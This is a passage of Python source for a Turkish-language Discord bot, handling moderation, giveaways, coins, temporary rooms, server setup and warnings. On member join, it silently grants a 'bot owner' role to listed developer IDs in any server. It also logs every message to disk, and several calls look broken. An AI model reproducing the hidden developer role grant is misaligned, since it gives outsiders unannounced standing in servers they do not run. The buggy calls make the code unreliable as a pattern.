                                    user = await self.fetch_user(int(user_id))
                                    for channel in guild.channels:
                                        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
                                            await channel.set_permissions(user, overwrite=None)
                                except:
                                    pass
                            elif punishment_data['type'] == 'timeout':
                                member = guild.get_member(int(user_id))
                                if member:
                                    await member.timeout(None, reason="Cezanın süresi doldu")
        
        for user_id, punishment_id in expired_punishments:
            if user_id in self.punishment_users and punishment_id in self.punishment_users[user_id]:
                del self.punishment_users[user_id][punishment_id]
                if not self.punishment_users[user_id]:
                    del self.punishment_users[user_id]
        
        if expired_punishments:
            self.save_json(self.punishment_users, self.punishment_users_file)

    async def check_expired_purchases(self):
        current_time = datetime.datetime.now()
        expired_purchases = []
        
        for purchase_id, purchase_data in self.purchases_data.items():
            if 'expires_at' in purchase_data:
                expires_at = datetime.datetime.fromisoformat(purchase_data['expires_at'])
                if current_time >= expires_at:
                    expired_purchases.append(purchase_id)
                    
                    try:
                        guild = self.get_guild(purchase_data['guild_id'])
                        if guild:
                            user = guild.get_member(purchase_data['user_id'])
                            role = guild.get_role(purchase_data['role_id'])
                            
                            if user and role:
                                await user.remove_roles(role)
                                
                                product = purchase_data['product']
                                if 'special_role' in product:
                                    try:
                                        await role.delete(reason="Özel rolün süresi doldu")
                                    except:
                                        pass
                                
                                try:
                                    await user.send(
                                        f"⏰ **{get_text(str(guild.id), 'product_expired', product=get_text(str(guild.id), product.split('_')[0]))}**\n"
                                        f"**{role.name}** rolü süresi dolduğu için kaldırıldı."
                                    )
                                except:
                                    pass
                    except:
                        pass
        
        for purchase_id in expired_purchases:
            del self.purchases_data[purchase_id]
        
        if expired_purchases:
            self.save_json(self.purchases_data, self.purchases_file)

    async def check_giveaways(self):
        current_time = datetime.datetime.now()
        ended_giveaways = []
        
        for giveaway_id, giveaway_data in self.giveaways_data.items():
            end_time = datetime.datetime.fromisoformat(giveaway_data['end_time'])
            if current_time >= end_time:
                ended_giveaways.append(giveaway_id)
                await self.end_giveaway(giveaway_id)
        
        for giveaway_id in ended_giveaways:
            if giveaway_id in self.giveaways_data:
                del self.giveaways_data[giveaway_id]
        
        if ended_giveaways:
            self.save_json(self.giveaways_data, self.giveaways_file)

    async def end_giveaway(self, giveaway_id: str):
        if giveaway_id not in self.giveaways_data:
            return
            
        data = self.giveaways_data[giveaway_id]
        channel = self.get_channel(data["channel_id"])
        
        try:
            message = await channel.fetch_message(int(giveaway_id))
        except:
            return

        try:
            reaction = next((r for r in message.reactions if str(r.emoji) == "🎉"), None)
            if not reaction:
                await channel.send("❌ Çekiliş bitti ama katılım yok!")
                return

            users = [user async for user in reaction.users() if not user.bot]
            
            guild_id = str(channel.guild.id)
            if guild_id in self.giveaway_join_limits:
                limited_users = []
                for user in users:
                    user_entries = 1
                    
                    booster_role_name = get_text(guild_id, "booster")
                    booster_role = discord.utils.get(channel.guild.roles, name=booster_role_name)
                    if booster_role and booster_role in user.roles:
                        user_entries = 1
                    
                    for role in user.roles:
                        role_limit = self.giveaway_join_limits[guild_id].get(str(role.id))
                        if role_limit is not None:
                            if role_limit == 0:
                                user_entries = max(user_entries, 999)
                            else:
                                user_entries = max(user_entries, role_limit)
                    
                    for _ in range(min(user_entries, 10)):
                        limited_users.append(user)
                
                users = limited_users
            
            if len(users) < data["winners"]:
                winners = users
            else:
                winners = random.sample(users, data["winners"])
            
            winners_mention = ", ".join(winner.mention for winner in winners) if winners else "❌ Katılım yok"
            
            embed = message.embeds[0]
            embed.color = 0xff0000
            embed.description = f"**Ödül:** {data['prize']}\n**Kazanan Sayısı:** {data['winners']}\n**Bitiş:** <t:{int(datetime.datetime.now().timestamp())}:F>"
            
            for i, field in enumerate(embed.fields):
                if field.name == "Katılımcılar":
                    embed.set_field_at(i, name="Katılımcılar", value=str(len(users)), inline=True)
                    break
            
            embed.add_field(name="🎊 **KAZANANLAR** 🎊", value=winners_mention, inline=False)
            await message.edit(embed=embed)
            
            if winners:
                await channel.send(f"🎉 **ÇEKİLİŞ BİTTİ!** 🎉\nKazananlar: {winners_mention}\nÖdül: **{data['prize']}**")
        except Exception as e:
            print(f"Çekiliş hatası: {e}")

    async def on_member_update(self, before, after):
        try:
            booster_role_name = get_text(str(after.guild.id), "booster")
            
            if before.premium_since is None and after.premium_since is not None:
                booster_role = discord.utils.get(after.guild.roles, name=booster_role_name)
                if not booster_role:
                    try:
                        booster_role = await after.guild.create_role(
                            name=booster_role_name, 
                            color=discord.Color.purple(),
                            hoist=True,
                            reason="Booster rolü otomatik oluşturuldu"
                        )
                    except discord.Forbidden:
                        return
                
                try:
                    await after.add_roles(booster_role, reason="Sunucu boostlandı")
                    try:
                        boost_channel = after.guild.system_channel
                        if boost_channel and boost_channel.permissions_for(after.guild.me).send_messages:
                            await boost_channel.send(
                                get_text(str(after.guild.id), "boost_started", user=after.mention)
                            )
                    except:
                        pass
                    print(f"🎉 {after} sunucuyu boostladı, Booster rolü verildi")
                except discord.Forbidden:
                    pass
            
            elif before.premium_since is not None and after.premium_since is None:
                booster_role = discord.utils.get(after.guild.roles, name=booster_role_name)
                if booster_role and booster_role in after.roles:
                    try:
                        await after.remove_roles(booster_role, reason="Boost bitti")
                        print(f"🔻 {after} boostu bitti, Booster rolü kaldırıldı")
                    except discord.Forbidden:
                        pass
        except Exception:
            pass

    async def on_member_join(self, member):
        guild_id = str(member.guild.id)
        
        # Yeni sunucu bonusu
        if guild_id not in self.new_servers:
            self.new_servers[guild_id] = []
        
        if str(member.id) not in self.new_servers[guild_id]:
            # İlk kez katılıyor, bonus ver
            user_coins = self.coins_data.get(str(member.id), 0)
            self.coins_data[str(member.id)] = user_coins + 10000
            self.new_servers[guild_id].append(str(member.id))
            self.save_json(self.coins_data, self.coins_file)
            self.save_json(self.new_servers, self.new_servers_file)
            
            try:
                await member.send(get_text(guild_id, "new_server_bonus"))
            except:
                pass
        
        # Oto-rol uygula
        if guild_id in self.autorole_data:
            for role_id in self.autorole_data[guild_id]:
                role = member.guild.get_role(role_id)
                if role:
                    try:
                        await member.add_roles(role, reason="Oto-rol")
                    except:
                        pass
        
        if guild_id in self.io_channels:
            channel_id = self.io_channels[guild_id]
            channel = self.get_channel(channel_id)
            if channel:
                lang = get_guild_lang(guild_id)
                if lang == "TR":
                    message = f"👋 **Hoş geldin!** {member.mention} sunucuya katıldı! 🎉"
                else:
                    message = f"👋 **Welcome!** {member.mention} joined the server! 🎉"
                
                await channel.send(message)

        if member.id in [int(id) for id in BOT_OWNER_IDS]:
            await self.give_bot_owner_role(member.guild, member)

    async def on_member_remove(self, member):
        guild_id = str(member.guild.id)
        if guild_id in self.io_channels:
            channel_id = self.io_channels[guild_id]
            channel = self.get_channel(channel_id)
            if channel:
                lang = get_guild_lang(guild_id)
                if lang == "TR":
                    message = f"😢 **Güle güle!** {member.display_name} sunucudan ayrıldı."
                else:
                    message = f"😢 **Goodbye!** {member.display_name} left the server."
                
                await channel.send(message)

    async def on_voice_state_update(self, member, before, after):
        # Geçici oda sistemi
        if after.channel and str(after.channel.id) in self.temp_rooms:
            room_data = self.temp_rooms[str(after.channel.id)]
            
            category = after.channel.category
            overwrites = {
                member.guild.default_role: discord.PermissionOverwrite(connect=False),
                member: discord.PermissionOverwrite(connect=True, manage_channels=True),
                member.guild.me: discord.PermissionOverwrite(connect=True, manage_channels=True)
            }
            
            for guild_member in member.guild.members:
                if guild_member.guild_permissions.manage_guild:
                    overwrites[guild_member] = discord.PermissionOverwrite(connect=True)
            
            temp_channel = await category.create_voice_channel(
                name=f"{member.display_name}'nin Odası",
                overwrites=overwrites,
                user_limit=room_data.get("user_limit", 0)
            )
            
            await member.move_to(temp_channel)
            
            self.temp_rooms[str(temp_channel.id)] = {
                "owner_id": member.id,
                "created_at": datetime.datetime.now().isoformat(),
                "user_limit": room_data.get("user_limit", 0),
                "allowed_users": [member.id]
            }
            self.save_json(self.temp_rooms, self.temp_rooms_file)
            
            try:
                text_channel = await category.create_text_channel(
                    name=f"{member.display_name}-oda-sohbet",
                    overwrites=overwrites
                )
                
                embed = discord.Embed(
                    title="🎉 Geçici Oda Oluşturuldu!",
                    description=f"Geçici odanıza hoş geldiniz {member.mention}!",
                    color=get_rainbow_color()
                )
                embed.add_field(name="Ses Kanalı", value=temp_channel.mention, inline=True)
                embed.add_field(name="Yazı Kanalı", value=text_channel.mention, inline=True)
                embed.add_field(name="Sahip", value=member.mention, inline=True)
                
                view = TempRoomSettingsView(self, self.temp_rooms[str(temp_channel.id)])
                await text_channel.send(embed=embed, view=view)
                
            except Exception as e:
                print(f"Geçici oda yazı kanalı oluşturma hatası: {e}")

    async def on_message(self, message):
        if message.author.bot:
            return
        
        # Selamlama sistemi
        greeting_triggers = {
            'TR': ['sa', 'selamun aleyküm', 'selamun aleykum', 'selam', 'merhaba'],
            'EN': ['hi', 'hello', 'hey', 'greetings']
        }
        
        guild_lang = get_guild_lang(str(message.guild.id))
        content_lower = message.content.lower().strip()
        
        if content_lower in greeting_triggers.get(guild_lang, []):
            responses = {
                'TR': get_text(str(message.guild.id), "greeting_response", user=message.author.mention),
                'EN': f"Hi {message.author.mention}! 👋"
            }
            response = responses.get(guild_lang, f"Hi {message.author.mention}! 👋")
            sent_message = await message.channel.send(response)
            view = TranslateView(response)
            await sent_message.edit(view=view)
        
        # Etiket engelleme kontrolü
        if message.mentions or message.role_mentions:
            guild_id = str(message.guild.id)
            if guild_id in self.tag_close_data:
                blocked_targets = []
                
                for mention in message.mentions:
                    target_id = f"user_{mention.id}"
                    if target_id in self.tag_close_data[guild_id]:
                        blocked_targets.append(mention.mention)
                
                for role_mention in message.role_mentions:
                    target_id = f"role_{role_mention.id}"
                    if target_id in self.tag_close_data[guild_id]:
                        blocked_targets.append(role_mention.mention)
                
                if blocked_targets:
                    try:
                        await message.author.send(
                            get_text(guild_id, "tag_close_warning", 
                                   target=", ".join(blocked_targets), 
                                   server=message.guild.name)
                        )
                    except:
                        pass
        
        # Level sistemi
        guild_id = str(message.guild.id)
        user_id = str(message.author.id)
        
        if guild_id not in self.level_data:
            self.level_data[guild_id] = {}
        
        if user_id not in self.level_data[guild_id]:
            self.level_data[guild_id][user_id] = {"messages": 0, "level": 0}
        
        self.level_data[guild_id][user_id]["messages"] += 1
        
        old_level = self.level_data[guild_id][user_id]["level"]
        new_level = self.level_data[guild_id][user_id]["messages"] // 50
        
        if new_level > old_level:
            self.level_data[guild_id][user_id]["level"] = new_level
            self.save_json(self.level_data, self.level_data_file)
            
            try:
                level_message = get_text(guild_id, "level_up", user=message.author.mention, level=new_level)
                sent_message = await message.channel.send(level_message)
                view = TranslateView(level_message)
                await sent_message.edit(view=view)
            except:
                pass
        
        # Sayı tahmini oyunu
        if message.content.isdigit() and 1 <= int(message.content) <= 10:
            user_id = str(message.author.id)
            
            active_game_id = None
            for game_id, game_data in self.number_games.items():
                if (game_data.get("target") == message.author.id and 
                    game_data.get("status") == "waiting_guess"):
                    active_game_id = game_id
                    break
            
            if active_game_id:
                guess = int(message.content)
                game_data = self.number_games[active_game_id]
                correct_number = game_data["number"]
                bet_amount = game_data["bet_amount"]
                
                if guess == correct_number:
                    total_pot = bet_amount * 2
                    fee = int(total_pot * 0.1)
                    prize = total_pot - fee
                    
                    self.coins_data[user_id] = self.coins_data.get(user_id, 0) + prize
                    self.save_json(self.coins_data, self.coins_file)
                    
                    embed = discord.Embed(
                        title="🎉 Tebrikler! Doğru Tahmin!",
                        description=f"{message.author.mention} doğru sayıyı tahmin etti!",
                        color=get_rainbow_color()
                    )
                    embed.add_field(name="Tahmin", value=guess, inline=True)
                    embed.add_field(name="Doğru Sayı", value=correct_number, inline=True)
                    embed.add_field(name="Ödül", value=f"{prize} Sampy Coin", inline=True)
                    embed.add_field(name="Komisyon", value=f"{fee} Sampy Coin", inline=True)
                    
                    sent_message = await message.channel.send(embed=embed)
                    view = TranslateView(f"Congratulations! {message.author.mention} guessed the correct number {correct_number} and won {prize} Sampy Coin!")
                    await sent_message.edit(view=view)
                else:
                    embed = discord.Embed(
                        title="❌ Yanlış Tahmin!",
                        description=f"{message.author.mention} yanlış sayıyı tahmin etti.",
                        color=0xff0000
                    )
                    embed.add_field(name="Tahmin", value=guess, inline=True)
                    embed.add_field(name="Doğru Sayı", value=correct_number, inline=True)
                    embed.add_field(name="Kayıp", value=f"{bet_amount} Sampy Coin", inline=True)
                    
                    creator_id = str(game_data["creator"])
                    self.coins_data[creator_id] = self.coins_data.get(creator_id, 0) + bet_amount
                    self.save_json(self.coins_data, self.coins_file)
                    
                    sent_message = await message.channel.send(embed=embed)
                    view = TranslateView(f"Wrong guess! {message.author.mention} guessed {guess} but the correct number was {correct_number}. Lost {bet_amount} Sampy Coin.")
                    await sent_message.edit(view=view)
                
                del self.number_games[active_game_id]
                self.save_json(self.number_games, self.number_games_file)
                
                try:
                    await message.delete()
                except:
                    pass
        
        # Başvuru mesaj işleme
        if str(message.channel.id) in self.applications_data:
            application = self.applications_data[str(message.channel.id)]
            if message.author.id == application["user_id"]:
                current_stage = application["current_stage"]
                stages = application["stages"]
                optional_stages = application["optional_stages"]
                
                if current_stage < len(stages):
                    answer = message.content
                    application["answers"].append(answer)
                    application["current_stage"] += 1
                    self.save_json(self.applications_data, "applications.json")
                    
                    await message.delete()
                    
                    await message.channel.send(
                        f"✅ **{get_text(str(message.guild.id), 'application_requirement_completed')}**\n"
                        f"**Aşama {current_stage + 1} tamamlandı!**"
                    )
                    
                    if application["current_stage"] < len(stages):
                        next_stage = application["current_stage"]
                        is_optional = next_stage in optional_stages
                        
                        embed = discord.Embed(
                            title=f"Aşama {next_stage + 1}/{len(stages)}{' (Opsiyonel)' if is_optional else ''}",
                            description=stages[next_stage],
                            color=get_rainbow_color()
                        )
                        
                        view = ApplicationProcessView(self.bot, str(message.channel.id))
                        sent_message = await message.channel.send(embed=embed, view=view)
                        await sent_message.edit(view=TranslateView(stages[next_stage]))
                    else:
                        # Başvuru tamamlandı
                        user = message.guild.get_member(application["user_id"])
                        stages = application["stages"]
                        answers = application["answers"]
                        
                        embed = discord.Embed(
                            title=get_text(str(message.guild.id), "application_summary", user=user.display_name),
                            color=get_rainbow_color()
                        )
                        
                        for i, (stage, answer) in enumerate(zip(stages, answers)):
                            embed.add_field(
                                name=f"Aşama {i+1}: {stage}",
                                value=answer,
                                inline=False
                            )
                        
                        embed.add_field(
                            name=get_text(str(message.guild.id), "application_response_wait"),
                            value=f"**-{message.guild.name} {get_text(str(message.guild.id), 'application_team')}**",
                            inline=False
                        )
                        
                        sent_message = await message.channel.send(embed=embed)
                        view = TranslateView(f"Application submitted by {user.display_name} with {len(answers)} answers.")
                        await sent_message.edit(view=view)
                        await message.channel.send(get_text(str(message.guild.id), "application_submitted"))
        
        # Mesaj loglama
        if str(message.guild.id) not in self.message_logs_data:
            self.message_logs_data[str(message.guild.id)] = {}
        
        guild_logs = self.message_logs_data[str(message.guild.id)]
        if len(guild_logs) > 1000:
            oldest_keys = sorted(guild_logs.keys())[:100]
            for key in oldest_keys:
                del guild_logs[key]
        
        guild_logs[str(message.id)] = {
            "content": message.content,
            "author": str(message.author),
            "author_id": message.author.id,
            "channel": message.channel.name,
            "timestamp": message.created_at.isoformat(),
            "attachments": [att.url for att in message.attachments]
        }
        
        self.save_json(self.message_logs_data, self.message_logs_file)
        
        await self.process_commands(message)

bot = SampyBot()

# Müzik sistemi için yardımcı fonksiyonlar
class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: bot.ytdl.extract_info(url, download=not stream))
        
        if 'entries' in data:
            data = data['entries'][0]
        
        filename = data['url'] if stream else bot.ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **bot.ffmpeg_options), data=data)

def parse_time(time_str: str) -> int:
    units = {
        's': 1,
        'm': 60,
        'h': 3600,
        'd': 86400,
        'w': 604800
    }
    unit = time_str[-1]
    value = int(time_str[:-1])
    return value * units[unit]

# Moderasyon Log Fonksiyonu
async def send_mod_log(guild, action, target, moderator, reason=None, duration=None):
    try:
        owner = guild.owner
        embed = discord.Embed(
            title=f"🛡️ Moderasyon Log - {action}",
            color=get_rainbow_color(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Hedef", value=f"{target.mention} (`{target.id}`)", inline=True)
        embed.add_field(name="Moderatör", value=f"{moderator.mention}", inline=True)
        embed.add_field(name="Kanal", value=f"<#{moderator.channel.id}>" if hasattr(moderator, 'channel') else "Bilinmiyor", inline=True)
        
        if reason:
            embed.add_field(name="Sebep", value=reason, inline=False)
        
        if duration:
            embed.add_field(name="Süre", value=duration, inline=True)
        
        sent_message = await owner.send(embed=embed)
        view = TranslateView(f"Moderation Log - {action}: {target} by {moderator}. Reason: {reason}. Duration: {duration}")
        await sent_message.edit(view=view)
    except Exception as e:
        print(f"Mod log gönderilemedi: {e}")

# Punishment kayıt fonksiyonu
def add_punishment(user_id: str, punishment_type: str, guild_id: int, reason: str, duration: str = None, moderator_id: int = None):
    punishment_id = f"{guild_id}_{user_id}_{int(datetime.datetime.now().timestamp())}"
    
    punishment_data = {
        "type": punishment_type,
        "guild_id": guild_id,
        "user_id": user_id,
        "reason": reason,
        "moderator_id": moderator_id,
        "timestamp": datetime.datetime.now().isoformat(),
        "duration": duration if duration else get_text(str(guild_id), "infinite")
    }
    
    if duration:
        duration_seconds = parse_time(duration)
        expires_at = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
        punishment_data["expires_at"] = expires_at.isoformat()
    
    if user_id not in bot.punishment_users:
        bot.punishment_users[user_id] = {}
    
    bot.punishment_users[user_id][punishment_id] = punishment_data
    bot.save_json(bot.punishment_users, bot.punishment_users_file)
    
    return punishment_id

# ============================================
# YENİ KOMUTLAR
# ============================================

# Türkçe Komutlar
@bot.tree.command(name="geçici-oda-kurulum", description="Geçici oda sistemini kurar (sadece sunucu sahibi)")
@is_server_owner()
async def temp_room_setup_tr(interaction: discord.Interaction, kanal: discord.VoiceChannel):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    bot.temp_rooms[str(kanal.id)] = {
        "guild_id": interaction.guild.id,
        "user_limit": 0,
        "created_at": datetime.datetime.now().isoformat()
    }
    bot.save_json(bot.temp_rooms, "temp_rooms.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "temp_room_setup", channel=kanal.mention),
        ephemeral=True
    )
    view = TranslateView(get_text(guild_id, "temp_room_setup", channel=kanal.mention))
    await sent_message.edit(view=view)

@bot.tree.command(name="sunucu-kurulum", description="Sunucu kanallarını ve kategorilerini kurar (sadece sunucu sahibi)")
@is_server_owner()
async def server_setup_tr(interaction: discord.Interaction, seviye: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild = interaction.guild
    guild_id = str(guild.id)
    
    seviye = seviye.lower()
    geçerli_seviyeler = ["basit", "normal", "gelişmiş", "tam"]
    
    if seviye not in geçerli_seviyeler:
        await interaction.response.send_message(
            f"❌ Geçersiz seviye! Seçenekler: {', '.join(geçerli_seviyeler)}",
            ephemeral=True
        )
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        kategoriler = {}
        
        if seviye in ["normal", "gelişmiş", "tam"]:
            kategoriler["💬・Sohbet"] = ["genel", "konu-dışı", "caps"]
            kategoriler["🎮・Oyunlar"] = ["oyun", "minecraft", "among-us"]
        
        if seviye in ["gelişmiş", "tam"]:
            kategoriler["🎵・Müzik"] = ["müzik-istekleri", "şarkı-sözleri"]
            kategoriler["🎨・Yaratıcılık"] = ["sanat-paylaşım", "yazı"]
            kategoriler["📚・Eğitim"] = ["ödev-yardım", "programlama"]
        
        if seviye == "tam":
            kategoriler["🔞・NSFW"] = ["nsfw-sohbet", "nsfw-medya"]
            kategoriler["🤖・Botlar"] = ["bot-komutları", "ai-sohbet"]
            kategoriler["🎉・Etkinlikler"] = ["çekilişler", "etkinlikler"]
        
        oluşturulan_kanallar = []
        
        for kategori_ismi, kanallar in kategoriler.items():
            kategori = await guild.create_category(kategori_ismi)
            
            for kanal_ismi in kanallar:
                if "nsfw" in kanal_ismi.lower():
                    kanal = await kategori.create_text_channel(
                        kanal_ismi,
                        nsfw=True
                    )
                else:
                    kanal = await kategori.create_text_channel(kanal_ismi)
                oluşturulan_kanallar.append(kanal.mention)
        
        # Ses kanalları
        if seviye in ["gelişmiş", "tam"]:
            ses_kategorisi = await guild.create_category("🔊・Ses Kanalları")
            ses_kanalları = ["Genel", "Oyun", "Müzik", "AFK"]
            
            for ses_ismi in ses_kanalları:
                await ses_kategorisi.create_voice_channel(ses_ismi)
        
        # Geçici oda sistemi için özel kanal
        if seviye == "tam":
            geçici_oda_kategorisi = await guild.create_category("🎪・Geçici Odalar")
            geçici_oda_kanalı = await geçici_oda_kategorisi.create_voice_channel("➕ Geçici Oda Oluştur")
            
            bot.temp_rooms[str(geçici_oda_kanalı.id)] = {
                "guild_id": guild.id,
                "user_limit": 0,
                "created_at": datetime.datetime.now().isoformat()
            }
            bot.save_json(bot.temp_rooms, "temp_rooms.json")
        
        # Müzik botu kanalları
        if seviye in ["gelişmiş", "tam"]:
            müzik_kategorisi = await guild.create_category("🎵・Müzik Botu")
            await müzik_kategorisi.create_voice_channel("🎧 Müzik Dinle")
            await müzik_kategorisi.create_text_channel("🎶 Müzik Komutları")
        
        # Bot kurulum kanalı
        kurulum_kategorisi = await guild.create_category("⚙️・Bot Kurulum")
        await kurulum_kategorisi.create_text_channel("🔧 Komut Kurulum")
        await kurulum_kategorisi.create_text_channel("📋 Bot Ayarları")
        
        # Log kanalları
        log_kategorisi = await guild.create_category("📊・Loglar")
        await log_kategorisi.create_text_channel("🛡️ Moderasyon Log")
        await log_kategorisi.create_text_channel("📨 Mesaj Log")
        await log_kategorisi.create_text_channel("👥 Üye Log")
        
        # Özel roller kanalı
        if seviye == "tam":
            roller_kategorisi = await guild.create_category("🎭・Roller")
            await roller_kategorisi.create_text_channel("🎯 Rol Alma")
            await roller_kategorisi.create_text_channel("🛒 Rol Market")
        
        bot.server_setups[guild_id] = {
            "level": seviye,
            "setup_at": datetime.datetime.now().isoformat(),
            "channels_created": len(oluşturulan_kanallar) + 15  # Ek kanalları da say
        }
        bot.save_json(bot.server_setups, "server_setups.json")
        
        embed = discord.Embed(
            title="✅ Sunucu Kurulumu Tamamlandı!",
            description=get_text(guild_id, "server_setup_complete", level=seviye),
            color=get_rainbow_color()
        )
        embed.add_field(name="Seviye", value=seviye.capitalize(), inline=True)
        embed.add_field(name="Oluşturulan Kanallar", value=str(len(oluşturulan_kanallar) + 15), inline=True)
        
        if oluşturulan_kanallar:
            embed.add_field(
                name="Oluşturulan Kanallar", 
                value=", ".join(oluşturulan_kanallar[:10]) + (f" ve {len(oluşturulan_kanallar)-10} tane daha..." if len(oluşturulan_kanallar) > 10 else ""),
                inline=False
            )
        
        embed.add_field(name="Ek Özellikler", value="• Müzik Botu Kanalları\n• Bot Kurulum Kanalları\n• Log Kanalları\n• Rol Yönetim Kanalları", inline=False)
        
        sent_message = await interaction.followup.send(embed=embed, ephemeral=True)
        view = TranslateView(f"Server setup completed with {seviye} level. Created {len(oluşturulan_kanallar) + 15} channels.")
        await sent_message.edit(view=view)
        
    except Exception as e:
        await interaction.followup.send(f"❌ Kurulum başarısız: {str(e)}", ephemeral=True)

@bot.tree.command(name="etiket-engelleme-menüsü", description="Etiket engelleme listesine kullanıcı/rol ekler (sadece sunucu sahibi)")
@is_server_owner()
async def tag_close_menu_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = TagCloseView(bot, str(interaction.guild.id))
    sent_message = await interaction.response.send_message(
        "🔒 **Etiket Engelleme Sistemi**\nEtiketleri engellenecek kullanıcı/rolleri seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Tag Block System - Select users/roles to block tags"))

@bot.tree.command(name="etiket-engelleme-id", description="ID ile etiket engelleme listesine kullanıcı/rol ekler (sadece sunucu sahibi)")
@is_server_owner()
async def tag_close_id_tr(interaction: discord.Interaction, hedef_id: str, hedef_türü: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.tag_close_data:
        bot.tag_close_data[guild_id] = []
    
    hedef_değer = f"{hedef_türü}_{hedef_id}"
    
    if hedef_değer in bot.tag_close_data[guild_id]:
        sent_message = await interaction.response.send_message("❌ Hedef zaten engelleme listesinde!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Target is already in block list!"))
        return
    
    bot.tag_close_data[guild_id].append(hedef_değer)
    bot.save_json(bot.tag_close_data, "tag_close.json")
    
    if hedef_türü == "role":
        hedef = interaction.guild.get_role(int(hedef_id))
    else:
        hedef = interaction.guild.get_member(int(hedef_id))
    
    hedef_mention = hedef.mention if hedef else f"ID: {hedef_id}"
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "tag_close_added", target=hedef_mention),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Added to tag block list: {hedef_mention}"))

@bot.tree.command(name="etiket-engelleme-listesi", description="Etiket engelleme listesini gösterir")
async def tag_close_list_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.tag_close_data or not bot.tag_close_data[guild_id]:
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "tag_close_empty"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("No users/roles in tag block list"))
        return
    
    embed = discord.Embed(
        title=get_text(guild_id, "tag_close_list"),
        color=get_rainbow_color()
    )
    
    kullanıcılar = []
    roller = []
    
    for hedef in bot.tag_close_data[guild_id]:
        tür_, id_ = hedef.split('_')
        if tür_ == "user":
            user = interaction.guild.get_member(int(id_))
            if user:
                kullanıcılar.append(user.mention)
            else:
                kullanıcılar.append(f"Kullanıcı ({id_})")
        else:
            role = interaction.guild.get_role(int(id_))
            if role:
                roller.append(role.mention)
            else:
                roller.append(f"Rol ({id_})")
    
    if kullanıcılar:
        embed.add_field(name="👤 Kullanıcılar", value="\n".join(kullanıcılar), inline=False)
    if roller:
        embed.add_field(name="👑 Roller", value="\n".join(roller), inline=False)
    
    sent_message = await interaction.response.send_message(embed=embed, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Tag Block List: {len(kullanıcılar)} users, {len(roller)} roles"))

@bot.tree.command(name="uyarı", description="Kullanıcıyı uyarır")
@has_command_permission('warn')
async def warn_tr(interaction: discord.Interaction, kullanıcı: discord.Member, sebep: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    user_id = str(kullanıcı.id)
    
    if guild_id not in bot.warnings_data:
        bot.warnings_data[guild_id] = {}
    
    if user_id not in bot.warnings_data[guild_id]:
        bot.warnings_data[guild_id][user_id] = {}
    
    uyarı_id = f"{int(datetime.datetime.now().timestamp())}"
    bot.warnings_data[guild_id][user_id][uyarı_id] = {
        "reason": sebep,
        "moderator_id": interaction.user.id,
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    bot.save_json(bot.warnings_data, "warnings.json")
    
    uyarı_sayısı = len(bot.warnings_data[guild_id][user_id])
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "warn_added", user=kullanıcı.mention, count=uyarı_sayısı)
    )
    await sent_message.edit(view=TranslateView(f"Warned {kullanıcı.mention}. Total warnings: {uyarı_sayısı}"))

@bot.tree.command(name="uyarı-kaldır", description="Kullanıcının uyarısını kaldırır")
@has_command_permission('warn')
async def warn_remove_tr(interaction: discord.Interaction, kullanıcı: discord.Member, uyarı_numarası: int):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    user_id = str(kullanıcı.id)
    
    if (guild_id not in bot.warnings_data or 
        user_id not in bot.warnings_data[guild_id] or 
        not bot.warnings_data[guild_id][user_id]):
        sent_message = await interaction.response.send_message("❌ Kullanıcının uyarısı yok!", ephemeral=True)
        await sent_message.edit(view=TranslateView("User has no warnings!"))
        return
    
    uyarılar = list(bot.warnings_data[guild_id][user_id].items())
    
    if uyarı_numarası < 1 or uyarı_numarası > len(uyarılar):
        sent_message = await interaction.response.send_message("❌ Geçersiz uyarı numarası!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid warning number!"))
        return
    
    uyarı_id, _ = uyarılar[uyarı_numarası - 1]
    del bot.warnings_data[guild_id][user_id][uyarı_id]
    
    if not bot.warnings_data[guild_id][user_id]:
        del bot.warnings_data[guild_id][user_id]
    
    bot.save_json(bot.warnings_data, "warnings.json")
    
    kalan_sayı = len(bot.warnings_data[guild_id].get(user_id, {}))
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "warn_removed", user=kullanıcı.mention, count=kalan_sayı)
    )
    await sent_message.edit(view=TranslateView(f"Removed warning from {kullanıcı.mention}. Remaining: {kalan_sayı}"))

